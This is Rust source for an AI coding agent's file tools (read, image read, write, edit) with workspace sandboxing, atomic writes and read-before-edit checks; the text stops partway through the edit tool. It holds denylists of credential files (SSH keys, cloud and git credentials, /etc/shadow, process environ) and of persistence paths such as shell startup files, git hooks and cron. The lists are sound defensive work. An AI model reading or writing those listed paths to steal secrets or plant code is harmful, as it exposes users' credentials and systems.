use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use anyhow::Result;
use async_trait::async_trait;
use ignore::WalkBuilder;
use serde_json::json;
use similar::{ChangeTag, TextDiff};

use crate::types::{Tool, ToolContext, ToolOutput};

/// Re-exported so every tool shares the *single* process-wide lock registry living in `corex-core`.
/// A second registry here would not see `corex-core`'s guards (sessions, settings) and would
/// silently reintroduce the parallel-edit lost-update bug.
pub(crate) use corex_core::lock_path;

/// Identifies sensitive system credential paths that must not be accessed arbitrarily by tools.
///
/// This is intentionally *also* consulted by the shell tool (a read-only binary such as `cat`
/// would otherwise leak secrets without ever prompting the user), so it is the single source of
/// truth for "this path holds credentials". Callers should pass a canonicalized path when the
/// file may be reached through a symlink.
fn is_sensitive_system_path_raw(path: &Path) -> bool {
    let p_str = path.to_string_lossy();

    // A bare credential directory (e.g. `~/.ssh`, `/home/x/.gnupg`, `~/.corex`, `~/.deepseek`).
    if p_str.ends_with("/.ssh")
        || p_str.ends_with(".ssh")
        || p_str.ends_with("/.gnupg")
        || p_str.ends_with(".gnupg")
        || p_str.ends_with("/.corex")
        || p_str == ".corex"
        || p_str.ends_with("/.deepseek")
        || p_str == ".deepseek"
    {
        return true;
    }

    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        let lower_name = name.to_ascii_lowercase();
        if (lower_name == ".env" || lower_name.starts_with(".env."))
            && !matches!(
                lower_name.as_str(),
                ".env.example" | ".env.sample" | ".env.template"
            )
        {
            return true;
        }
    }

    const SENSITIVE_FRAGMENTS: &[&str] = &[
        ".ssh/",
        ".gnupg/",
        ".corex/",
        ".deepseek/",
        ".askpass_cred",
        ".aws/credentials",
        ".docker/config.json",
        ".git-credentials",
        ".kube/config",
        ".netrc",
        ".npmrc",
        "/etc/shadow",
        "/etc/gshadow",
        "/etc/sudoers",
    ];
    if SENSITIVE_FRAGMENTS.iter().any(|frag| p_str.contains(frag)) {
        return true;
    }

    // `/proc/<pid>/{environ,mem}` expose inherited environment and process memory.
    if (p_str.starts_with("/proc/") || p_str.starts_with("/proc/self/"))
        && (p_str.ends_with("/environ") || p_str.ends_with("/mem"))
    {
        return true;
    }

    false
}

pub fn is_sensitive_system_path(path: &Path) -> bool {
    if is_sensitive_system_path_raw(path) {
        return true;
    }
    if let Ok(canon) = path.canonicalize() {
        if is_sensitive_system_path_raw(&canon) {
            return true;
        }
    }
    false
}

fn is_protected_write_path_raw(path: &Path) -> bool {
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        const PROTECTED_NAMES: &[&str] = &[
            ".bashrc",
            ".bash_profile",
            ".bash_login",
            ".profile",
            ".zshrc",
            ".zprofile",
            ".zshenv",
            ".gitconfig",
            ".git-credentials",
            ".gitmodules",
        ];
        if PROTECTED_NAMES.contains(&name) {
            return true;
        }
    }

    let p_str = path.to_string_lossy();
    // A repository's own config can name programs git runs implicitly (`core.fsmonitor`,
    // `core.hooksPath`, `diff.external`, textconv/filter drivers), even for read-only commands
    // such as `git status` or `git diff`.
    p_str.ends_with("/.git/config")
        || p_str == ".git/config"
        || p_str.contains("/.git/info/attributes")
        || p_str.contains("/.git/hooks/")
        || p_str.contains("/.corex/")
        || p_str.starts_with(".corex/")
        || p_str.ends_with("/.corex")
        || p_str == ".corex"
        || p_str.contains("/.deepseek/")
        || p_str.starts_with(".deepseek/")
        || p_str.ends_with("/.deepseek")
        || p_str == ".deepseek"
        || p_str.ends_with("/.ssh/authorized_keys")
        || p_str.ends_with("/.ssh/config")
        || p_str.contains("/authorized_keys")
        || p_str.contains("/.cargo/config.toml")
        || p_str.ends_with("/.cargo/config")
        || p_str.contains("/.config/systemd/user/")
        || p_str.contains("/.config/fish/config.fish")
        || p_str.contains("/etc/profile.d/")
        || p_str.contains("/etc/cron.d/")
        || p_str.contains("/etc/crontab")
}

/// Paths whose modification would grant code execution or credential persistence to the user's
/// shell/tooling. Unlike [`is_sensitive_system_path`], these are *refused outright* — even in
/// YOLO mode — because writing them turns a normal file edit into persistent code execution.
pub fn is_protected_write_path(path: &Path) -> bool {
    if is_protected_write_path_raw(path) {
        return true;
    }
    if let Ok(canon) = path.canonicalize() {
        if is_protected_write_path_raw(&canon) {
            return true;
        }
    }
    false
}

/// Lexically normalizes `.` and `..` components in a path so `workspace.join("../../etc")`
/// cannot masquerade as starting with `workspace`.
pub fn clean_lexical_path(path: &Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            Component::CurDir => {}
            Component::ParentDir => {
                if ! matches!(out.components().next_back(), Some(Component::RootDir | Component::Prefix(_)) | None) {
                    out.pop();
                }
            }
            other => out.push(other.as_os_str()),
        }
    }
    if out.as_os_str().is_empty() {
        PathBuf::from(".")
    } else {
        out
    }
}

/// Checks if `path` resides inside `workspace`, accounting for both `..` traversal and symlinks.
pub fn is_within_workspace(path: &Path, workspace: &Path) -> bool {
    use std::path::Component;

    let resolved = if path.is_absolute() {
        path.to_path_buf()
    } else {
        workspace.join(path)
    };

    if let Ok(canonical_ws) = workspace.canonicalize() {
        if let Ok(canonical_path) = resolved.canonicalize() {
            return canonical_path.starts_with(&canonical_ws);
        }

        // Target does not exist yet: walk up ancestors to find the deepest existing ancestor.
        for ancestor in resolved.ancestors() {
            if let Ok(meta) = fs::symlink_metadata(ancestor) {
                let Ok(canon_ancestor) = ancestor.canonicalize() else {
                    // Broken symlink: refuse rather than falling back to lexical check.
                    return false;
                };
                if meta.file_type().is_symlink() && !canon_ancestor.starts_with(&canonical_ws) {
                    return false;
                }
                if let Ok(rem) = resolved.strip_prefix(ancestor) {
                    if rem.components().any(|c| matches!(c, Component::ParentDir)) {
                        return false;
                    }
                }
                return canon_ancestor.starts_with(&canonical_ws);
            }
        }
        return false;
    }

    let clean_ws = clean_lexical_path(workspace);
    let clean_target = clean_lexical_path(&resolved);
    clean_target.starts_with(&clean_ws)
}

/// Confirmation policy shared by the read-only filesystem tools (`read_file`, `grep_search`,
/// `glob`, `list_directory`).
///
/// Inside the workspace they run freely. Anything outside it needs approval: the denylist in
/// [`is_sensitive_system_path`] can never enumerate every credential store (CLI tokens, cloud SDK
/// configs, browser profiles…), and an unapproved read followed by a network tool call is all a
/// prompt injection needs to leak one. Approving with "always allow" stores the tool name.
pub fn read_path_needs_confirmation(
    tool_name: &str,
    raw_path: Option<&str>,
    context: &ToolContext,
) -> bool {
    let Some(raw) = raw_path.map(str::trim).filter(|p| !p.is_empty()) else {
        return false; // defaults to the workspace root
    };
    let path = resolve_path(&context.workspace_dir, raw);
    if is_within_workspace(&path, &context.workspace_dir) && !is_sensitive_system_path(&path) {
        return false;
    }
    // Output the harness itself spilled to disk is meant to be read back without a prompt.
    if tool_name != "write_file" && corex_core::is_spill_path(&path) {
        return false;
    }
    !context.allowed_commands.iter().any(|c| c == tool_name)
}

/// Resolves a file path: expands `~/` to the user home directory,
/// preserves absolute paths, joins relative paths with the workspace directory,
/// and normalizes `.` / `..` components.
pub fn resolve_path(workspace: &Path, rel: &str) -> PathBuf {
    let raw = if let Some(stripped) = rel.strip_prefix("~/") {
        if let Some(base) = directories::BaseDirs::new() {
            base.home_dir().join(stripped)
        } else {
            PathBuf::from(rel)
        }
    } else {
        let p = Path::new(rel);
        if p.is_absolute() {
            p.to_path_buf()
        } else {
            workspace.join(p)
        }
    };
    clean_lexical_path(&raw)
}

/// Detects if a file is binary by inspecting the first 1024 bytes for null bytes.
pub fn is_binary_file(path: &Path) -> bool {
    if let Ok(mut file) = fs::File::open(path) {
        let mut buffer = [0u8; 1024];
        if let Ok(bytes_read) = file.read(&mut buffer) {
            return buffer[..bytes_read].contains(&0);
        }
    }
    false
}

/// Writes `content` to a fresh temporary file next to `target`, synced to disk.
fn stage_temp_file(target: &Path, content: &str) -> std::io::Result<PathBuf> {
    use std::io::Write;
    let pid = std::process::id();
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp_path = target.with_extension(format!("tmp.{}.{}", pid, ts));
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&tmp_path)?;
    if let Err(e) = file.write_all(content.as_bytes()).and_then(|_| file.sync_all()) {
        let _ = fs::remove_file(&tmp_path);
        return Err(e);
    }
    Ok(tmp_path)
}

/// Writes content to a file atomically via a temporary file in the same directory,
/// preventing corruption if the process is interrupted.
pub fn atomic_write(path: &Path, content: &str) -> std::io::Result<()> {
    let target_path = match path.canonicalize() {
        Ok(canonical) => canonical,
        Err(_) => path.to_path_buf(),
    };
    if let Some(parent) = target_path.parent() {
        fs::create_dir_all(parent)?;
    }
    let existing_perms = fs::metadata(&target_path).ok().map(|m| m.permissions());
    let tmp_path = stage_temp_file(&target_path, content)?;
    if let Some(perms) = existing_perms {
        let _ = fs::set_permissions(&tmp_path, perms);
    }
    if let Err(e) = fs::rename(&tmp_path, &target_path) {
        let _ = fs::remove_file(&tmp_path);
        return Err(e);
    }
    Ok(())
}

/// Atomically creates `path` with `content`, failing with `AlreadyExists` instead of replacing a
/// file that appeared in the meantime. The content is staged first and published with a hard link,
/// which refuses to overwrite, so a concurrent creator's file is never clobbered or seen half-written.
pub fn atomic_create(path: &Path, content: &str) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let tmp_path = stage_temp_file(path, content)?;
    let published = fs::hard_link(&tmp_path, path);
    let _ = fs::remove_file(&tmp_path);
    match published {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => Err(e),
        // Filesystems without hard links: fall back to an exclusive create.
        Err(_) => {
            use std::io::Write;
            let mut file = fs::OpenOptions::new().write(true).create_new(true).open(path)?;
            file.write_all(content.as_bytes())?;
            file.sync_all()
        }
    }
}

/// What a file looked like when the model last saw or wrote it.
#[derive(Clone, Copy, PartialEq, Eq)]
struct FileStamp {
    len: u64,
    mtime_ns: u128,
    ino: u64,
}

/// Files the model has read or written, with the state they were in at that moment.
///
/// Process-wide on purpose, like [`lock_path`]: tools carry no session handle, so subagents share
/// it. That only ever loosens the "read it first" rule; the staleness check still guards each file.
fn observed_files() -> &'static std::sync::Mutex<std::collections::HashMap<PathBuf, FileStamp>> {
    static OBSERVED: std::sync::OnceLock<std::sync::Mutex<std::collections::HashMap<PathBuf, FileStamp>>> =
        std::sync::OnceLock::new();
    OBSERVED.get_or_init(Default::default)
}

fn observed_key(path: &Path) -> PathBuf {
    path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
}

fn file_stamp(path: &Path) -> Option<FileStamp> {
    let meta = fs::metadata(path).ok()?;
    let mtime_ns = meta
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    #[cfg(unix)]
    let ino = std::os::unix::fs::MetadataExt::ino(&meta);
    #[cfg(not(unix))]
    let ino = 0;
    Some(FileStamp { len: meta.len(), mtime_ns, ino })
}

/// Records the file's current state as the one the model has seen. Call after a read or after a
/// successful write, so the model's own edits never count as external changes.
pub fn observe_file(path: &Path) {
    if let Some(stamp) = file_stamp(path) {
        if let Ok(mut map) = observed_files().lock() {
            map.insert(observed_key(path), stamp);
        }
    }
}

/// Refuses to modify an existing file the model never read, or one that changed since it did.
/// A missing file passes: creating it needs no prior read.
pub fn check_observed(path: &Path, display: &str) -> Result<(), String> {
    let Some(current) = file_stamp(path) else {
        return Ok(());
    };
    let seen = observed_files()
        .lock()
        .ok()
        .and_then(|map| map.get(&observed_key(path)).copied());
    match seen {
        None => Err(format!(
            "Refusing to modify {}: the file has not been read in this session. Read it with read_file, then retry.",
            display
        )),
        Some(seen) if seen != current => Err(format!(
            "Refusing to modify {}: the file changed since it was read. Re-read it with read_file, then retry.",
            display
        )),
        Some(_) => Ok(()),
    }
}

/// Formats byte counts into clean human-readable representations.
pub fn format_size(bytes: u64) -> String {
    if bytes < 1024 {
        format!("{} B", bytes)
    } else if bytes < 1024 * 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
    }
}

/// Checks whether any file-editing permission is present in `allowed_commands`.
/// This unifies permissions across `edit`, `apply_patch`, `write_file`, and legacy aliases.
pub fn is_file_edit_allowed(allowed_commands: &[String]) -> bool {
    allowed_commands.iter().any(|cmd| {
        cmd == "edit"
            || cmd == "edit_file"
            || cmd == "apply_patch"
            || cmd == "write_file"
            || cmd == "replace"
            || cmd == "file_edit"
    })
}

// ─── 1. ReadFileTool ────────────────────────────────────────────────────────

/// Longest line `read_file` returns whole; a minified bundle would otherwise flood the context.
const READ_MAX_LINE_CHARS: usize = 2000;
/// Most text one `read_file` call returns before asking the caller to page.
const READ_MAX_OUTPUT_BYTES: usize = 100 * 1024;


pub struct ReadFileTool;

#[async_trait]
impl Tool for ReadFileTool {
    fn name(&self) -> &'static str {
        "read_file"
    }

    fn description(&self) -> &'static str {
        "Reads the contents of a file with line numbers and optional start/end ranges. Includes binary file protection and automatic pagination. [PREFERRED instead of shell cat]"
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        read_path_needs_confirmation(
            self.name(),
            args.get("file_path").and_then(|v| v.as_str()),
            context,
        )
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "The path of the file to read (relative or absolute, supports ~/)."
                },
                "start_line": {
                    "type": "integer",
                    "description": "Optional 1-indexed start line number."
                },
                "end_line": {
                    "type": "integer",
                    "description": "Optional 1-indexed end line number."
                }
            },
            "required": ["file_path"]
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };

        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: reading sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        if !path.exists() {
            return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
        }

        if path.is_dir() {
            return Ok(ToolOutput::error(format!(
                "Path '{}' is a directory, not a file. Use 'list_directory' to inspect directory contents.",
                rel_path
            )));
        }

        let metadata = fs::metadata(&path).ok();
        let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);

        if is_binary_file(&path) {
            let mut header = [0u8; 32];
            let is_image = fs::File::open(&path)
                .and_then(|mut f| {
                    let n = f.read(&mut header)?;
                    Ok(sniff_image_media_type(&header[..n]).is_some())
                })
                .unwrap_or(false);
            let hint = if is_image {
                " It is an image: use 'read_image' to view it."
            } else {
                ""
            };
            return Ok(ToolOutput::success(format!(
                "[Binary file: {} ({}). Cannot display content as plain text.{}]",
                rel_path,
                format_size(size),
                hint
            )));
        }

        if size > 10 * 1024 * 1024 {
            return Ok(ToolOutput::error(format!(
                "File '{}' is too large ({}). Maximum read limit is 10 MB to prevent memory exhaustion. Use 'run_shell_command' with head/tail or grep instead.",
                rel_path,
                format_size(size)
            )));
        }

        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(e) if e.kind() == std::io::ErrorKind::InvalidData => {
                return Ok(ToolOutput::error(format!(
                    "{} is not valid UTF-8 text, so it cannot be shown or edited as text. \
                     Use 'run_shell_command' (e.g. file, xxd) to inspect it.",
                    rel_path
                )));
            }
            Err(e) => return Ok(ToolOutput::error(format!("Failed to read {}: {}", rel_path, e))),
        };

        let lines: Vec<&str> = content.lines().collect();
        let total_lines = lines.len();

        let start_line = args.get("start_line").and_then(|v| v.as_u64()).map(|v| v as usize);
        let end_line = args.get("end_line").and_then(|v| v.as_u64()).map(|v| v as usize);

        let default_limit = 1000;
        let s = start_line.unwrap_or(1).saturating_sub(1);
        let e = match (start_line, end_line) {
            (_, Some(end)) => end.min(total_lines),
            (Some(start), None) => (start.saturating_sub(1) + default_limit).min(total_lines),
            (None, None) => default_limit.min(total_lines),
        };

        if total_lines == 0 {
            observe_file(&path);
            return Ok(ToolOutput::success("(Empty file)".to_string()));
        }

        if s >= total_lines {
            return Ok(ToolOutput::error(format!(
                "Start line {} exceeds total lines {} in {}",
                s + 1,
                total_lines,
                rel_path
            )));
        }

        if s > e {
            return Ok(ToolOutput::error(format!(
                "Invalid line range: start_line ({}) cannot be greater than end_line ({}) in {}",
                s + 1,
                e,
                rel_path
            )));
        }

        observe_file(&path);

        let mut output = String::new();
        let mut shown_end = s;
        for (i, line) in lines[s..e].iter().enumerate() {
            let rendered = if line.chars().count() > READ_MAX_LINE_CHARS {
                let head: String = line.chars().take(READ_MAX_LINE_CHARS).collect();
                format!("{}… [line truncated, {} chars total]", head, line.chars().count())
            } else {
                (*line).to_string()
            };
            // Always show at least one line so an oversized read still makes progress.
            if i > 0 && output.len() + rendered.len() > READ_MAX_OUTPUT_BYTES {
                break;
            }
            output.push_str(&format!("{:4} | {}\n", s + i + 1, rendered));
            shown_end = s + i + 1;
        }
        let e = shown_end;

        if e < total_lines {
            output.push_str(&format!(
                "\n... [Showing lines {}-{} of {}. Specify start_line={} to continue reading]\n",
                s + 1,
                e,
                total_lines,
                e + 1
            ));
        }

        if output.is_empty() {
            output = "(Empty file)".to_string();
        }

        Ok(ToolOutput::success(output))
    }
}

// ─── 1b. ReadImageTool ──────────────────────────────────────────────────────

/// Largest image `read_image` loads; matches the strictest provider limit (5 MB per image).
pub const READ_IMAGE_MAX_BYTES: u64 = 5 * 1024 * 1024;

/// Identifies PNG, JPEG, GIF and WebP from their file signature, ignoring the extension.
pub fn sniff_image_media_type(data: &[u8]) -> Option<&'static str> {
    if data.starts_with(&[0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a]) {
        Some("image/png")
    } else if data.starts_with(&[0xff, 0xd8, 0xff]) {
        Some("image/jpeg")
    } else if data.starts_with(b"GIF87a") || data.starts_with(b"GIF89a") {
        Some("image/gif")
    } else if data.len() >= 12 && &data[0..4] == b"RIFF" && &data[8..12] == b"WEBP" {
        Some("image/webp")
    } else {
        None
    }
}

pub struct ReadImageTool;

#[async_trait]
impl Tool for ReadImageTool {
    fn name(&self) -> &'static str {
        "read_image"
    }

    fn description(&self) -> &'static str {
        "Looks at a PNG/JPEG/GIF/WebP image file: the image itself is shown to you in the next message. \
         Use it for screenshots, diagrams and photos instead of shell tools. Requires a vision-capable model; \
         images over 5 MB are refused."
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        read_path_needs_confirmation(
            self.name(),
            args.get("file_path").and_then(|v| v.as_str()),
            context,
        )
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "Path of the image file (relative or absolute, supports ~/)."
                }
            },
            "required": ["file_path"]
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        use base64::Engine;

        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) if !p.trim().is_empty() => p,
            _ => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };
        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: reading sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        let Ok(meta) = fs::metadata(&path) else {
            return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
        };
        if !meta.is_file() {
            return Ok(ToolOutput::error(format!("'{}' is not a regular file.", rel_path)));
        }
        if meta.len() > READ_IMAGE_MAX_BYTES {
            return Ok(ToolOutput::error(format!(
                "Image '{}' is {} which exceeds the {} limit. Downscale it (e.g. with ImageMagick `convert -resize`) and read the smaller copy.",
                rel_path,
                format_size(meta.len()),
                format_size(READ_IMAGE_MAX_BYTES)
            )));
        }
        let data = match fs::read(&path) {
            Ok(d) => d,
            Err(e) => return Ok(ToolOutput::error(format!("Failed to read {}: {}", rel_path, e))),
        };
        let Some(media_type) = sniff_image_media_type(&data) else {
            return Ok(ToolOutput::error(format!(
                "'{}' is not a supported image (PNG, JPEG, GIF or WebP). Use read_file for text.",
                rel_path
            )));
        };

        let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
        corex_core::push_tool_image(rel_path, format!("data:{};base64,{}", media_type, encoded));

        Ok(ToolOutput::success_with_summary(
            format!(
                "Loaded {} ({}, {}). The image is attached in the next message.",
                rel_path,
                media_type,
                format_size(data.len() as u64)
            ),
            format!("Viewed {}", rel_path),
        ))
    }
}

// ─── 2. WriteFileTool ───────────────────────────────────────────────────────

pub struct WriteFileTool;

#[async_trait]
impl Tool for WriteFileTool {
    fn name(&self) -> &'static str {
        "write_file"
    }

    fn description(&self) -> &'static str {
        "Writes complete content to a file atomically, creating any missing parent directories. Overwriting an existing file requires reading it first. [PREFERRED for new files]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "Path to the file to write (relative or absolute, supports ~/)."
                },
                "content": {
                    "type": "string",
                    "description": "The exact full text content to write."
                }
            },
            "required": ["file_path", "content"]
        })
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        if let Some(rel) = args.get("file_path").and_then(|v| v.as_str()) {
            let path = resolve_path(&context.workspace_dir, rel);
            if !is_within_workspace(&path, &context.workspace_dir)
                || is_sensitive_system_path(&path)
                || is_protected_write_path(&path)
            {
                return true;
            }
        }
        !is_file_edit_allowed(&context.allowed_commands)
    }

    fn format_diff(&self, args: &serde_json::Value, workspace: &Path) -> Option<String> {
        let rel_path = args.get("file_path")?.as_str()?;
        let new_content = args.get("content")?.as_str()?;
        let path = resolve_path(workspace, rel_path);

        let old_content = fs::read_to_string(&path).unwrap_or_default();
        let diff = TextDiff::from_lines(old_content.as_str(), new_content);

        let mut formatted = format!("--- a/{}\n+++ b/{}\n", rel_path, rel_path);
        for change in diff.iter_all_changes() {
            let sign = match change.tag() {
                ChangeTag::Delete => "-",
                ChangeTag::Insert => "+",
                ChangeTag::Equal => " ",
            };
            formatted.push_str(&format!("{}{}", sign, change));
        }
        Some(formatted)
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };
        let content = match args.get("content").and_then(|v| v.as_str()) {
            Some(c) => c,
            None => return Ok(ToolOutput::error("Missing 'content' argument.")),
        };

        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: writing to sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        if is_protected_write_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Refusing to write to protected path '{}': shell startup files, git hooks and cron \
                 entries can execute arbitrary code. Edit it manually if this is intentional.",
                rel_path
            )));
        }

        // Serialize writes to this path so parallel batches cannot interleave their writes.
        let _guard = lock_path(&path).await;

        let existed = path.exists();
        if existed {
            if let Err(msg) = check_observed(&path, rel_path) {
                return Ok(ToolOutput::error(msg));
            }
        }
        let old_size = if existed {
            fs::metadata(&path).map(|m| m.len()).unwrap_or(0)
        } else {
            0
        };

        // Keep the file's own line-ending convention when the new content never mentioned one.
        let mut converted = false;
        let content: std::borrow::Cow<str> = if existed
            && !content.contains('\r')
            && fs::read_to_string(&path).map_or(false, |old| {
                old.contains("\r\n") && old.matches('\n').count() == old.matches("\r\n").count()
            })
        {
            converted = content.contains('\n');
            std::borrow::Cow::Owned(content.replace('\n', "\r\n"))
        } else {
            std::borrow::Cow::Borrowed(content)
        };
        let content: &str = &content;

        let written = if existed {
            atomic_write(&path, content)
        } else {
            atomic_create(&path, content)
        };
        if let Err(e) = written {
            let msg = if e.kind() == std::io::ErrorKind::AlreadyExists {
                format!(
                    "Refusing to create {}: it was created by someone else in the meantime. Read it with read_file, then edit it.",
                    rel_path
                )
            } else {
                format!("Failed to write to {}: {}", rel_path, e)
            };
            return Ok(ToolOutput::error(msg));
        }
        observe_file(&path);

        let line_count = content.lines().count();
        let byte_count = content.len();
        let eol_note = if converted { " Line endings kept as CRLF to match the existing file." } else { "" };
        let summary_msg = if existed {
            format!(
                "Successfully updated {} ({} lines, {}, previous size: {}).",
                rel_path,
                line_count,
                format_size(byte_count as u64),
                format_size(old_size)
            )
        } else {
            format!(
                "Successfully created {} ({} lines, {}).",
                rel_path,
                line_count,
                format_size(byte_count as u64)
            )
        };

        Ok(ToolOutput::success_with_summary(
            format!("{}{}", summary_msg, eol_note),
            format!("Wrote {}", rel_path),
        ))
    }
}

// ─── 3. EditTool ────────────────────────────────────────────────────────────

pub struct EditTool;

/// Lines of untouched context kept around every change in an edit preview.
const EDIT_PREVIEW_CONTEXT: usize = 3;

/// Renders what an edit did as a diff, removals included.
///
/// Showing the resulting file alone hides half of the change: whatever the edit dropped never
/// reaches the screen. Each row is `marker + line number + text`, where `-` is a line that left the
/// file, `+` one that replaced it and a space an untouched line around them, numbered on the side
/// it belongs to. Untouched stretches between distant changes are elided to keep it readable.
fn format_edit_preview(old_content: &str, new_content: &str) -> String {
    let diff = TextDiff::from_lines(old_content, new_content);

    // First pass: which rows changed, and with them which untouched ones are worth showing.
    let mut changed = Vec::new();
    let mut total_rows = 0usize;
    for (idx, change) in diff.iter_all_changes().enumerate() {
        total_rows = idx + 1;
        if change.tag() != ChangeTag::Equal {
            changed.push(idx);
        }
    }
    if changed.is_empty() {
        return String::new();
    }

    let mut keep = vec![false; total_rows];
    for &idx in &changed {
        let start = idx.saturating_sub(EDIT_PREVIEW_CONTEXT);
        let end = idx.saturating_add(EDIT_PREVIEW_CONTEXT).min(total_rows - 1);
        for slot in keep.iter_mut().take(end + 1).skip(start) {
            *slot = true;
        }
    }

    let first = changed[0].saturating_sub(EDIT_PREVIEW_CONTEXT);
    let last = changed[changed.len() - 1].saturating_add(EDIT_PREVIEW_CONTEXT).min(total_rows - 1);

    // Second pass: only the kept rows are materialised, so a large file costs nothing.
    let mut preview = String::new();
    let mut previous: Option<usize> = None;
    for (idx, change) in diff.iter_all_changes().enumerate() {
        if idx < first || idx > last || !keep[idx] {
            continue;
        }
        if let Some(previous) = previous {
            if idx > previous + 1 {
                preview.push_str(&format!("   ⋯ | {} lines not shown\n", idx - previous - 1));
            }
        }
        let (marker, number) = match change.tag() {
            ChangeTag::Delete => ('-', change.old_index().unwrap_or(0) + 1),
            ChangeTag::Insert => ('+', change.new_index().unwrap_or(0) + 1),
            ChangeTag::Equal => (' ', change.new_index().unwrap_or(0) + 1),
        };
        let text = change.value().trim_end_matches(['\n', '\r']);
        preview.push_str(&format!("{}{:4} | {}\n", marker, number, text));
        previous = Some(idx);
    }
    preview
}

#[async_trait]
impl Tool for EditTool {
    fn name(&self) -> &'static str {
        "edit"
    }

    fn description(&self) -> &'static str {
        "Replaces exact text within a file (old_string -> new_string). The file must have been read with read_file first. Includes CRLF/LF resilience, whitespace-tolerant fallback matching, intelligent diagnostics, and immediate edit preview. [PREFERRED for surgical code edits]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "Path to the file to edit (relative or absolute, supports ~/)."
                },
                "instruction": {
                    "type": "string",
                    "description": "A clear description of what and why the change is being made."
                },
                "old_string": {
                    "type": "string",
                    "description": "The exact literal string segment to replace (including indentation and surrounding context lines)."
                },
                "new_string": {
                    "type": "string",
                    "description": "The exact literal replacement string."
                },
                "allow_multiple": {
                    "type": "boolean",
                    "description": "Whether to replace multiple occurrences if found (default false)."
                }
            },
            "required": ["file_path", "old_string", "new_string"]
        })
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        if let Some(rel) = args.get("file_path").and_then(|v| v.as_str()) {
            let path = resolve_path(&context.workspace_dir, rel);
            if !is_within_workspace(&path, &context.workspace_dir)
                || is_sensitive_system_path(&path)
                || is_protected_write_path(&path)
            {
                return true;
            }
        }
        !is_file_edit_allowed(&context.allowed_commands)
    }

    fn format_diff(&self, args: &serde_json::Value, workspace: &Path) -> Option<String> {
        let rel_path = args.get("file_path")?.as_str()?;
        let old_str = args.get("old_string")?.as_str()?;
        let new_str = args.get("new_string")?.as_str()?;
        let allow_multiple = args.get("allow_multiple").and_then(|v| v.as_bool()).unwrap_or(false);

        let path = resolve_path(workspace, rel_path);
        let content = fs::read_to_string(&path).ok()?;

        let (base_content, new_content) = if content.contains(old_str) {
            let updated = if allow_multiple {
                content.replace(old_str, new_str)
            } else {
                content.replacen(old_str, new_str, 1)
            };
            (content, updated)
        } else {
            let content_norm = content.replace("\r\n", "\n");
            let old_norm = old_str.replace("\r\n", "\n");
            let new_norm = new_str.replace("\r\n", "\n");
            let updated = if allow_multiple {
                content_norm.replace(&old_norm, &new_norm)
            } else {
                content_norm.replacen(&old_norm, &new_norm, 1)
            };
            (content_norm, updated)
        };

        let diff = TextDiff::from_lines(base_content.as_str(), new_content.as_str());
        let formatted = diff
            .unified_diff()
            .context_radius(3)
            .header(&format!("a/{}", rel_path), &format!("b/{}", rel_path))
            .to_string();
        Some(formatted)
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };
        let old_string = match args.get("old_string").and_then(|v| v.as_str()) {
